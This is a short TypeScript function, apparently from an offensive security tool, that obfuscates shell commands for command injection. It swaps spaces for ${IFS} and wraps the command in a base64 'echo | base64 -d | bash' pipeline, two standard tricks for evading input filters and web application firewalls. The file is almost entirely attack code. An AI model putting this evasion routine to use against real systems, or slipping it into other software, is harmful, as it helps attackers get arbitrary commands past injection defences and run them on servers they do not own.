export function applyQuantumBypass(cmd: string, mode: string): string {
  if (!cmd) return "";
  let p = String(cmd);
  if (["oob", "quantum"].includes(mode)) {
    p = p.replace(/ /g, "${IFS}");
    const b64 = Buffer.from(p).toString("base64");
    p = `echo ${b64} | base64 -d | bash`;
  }
  return p;
}
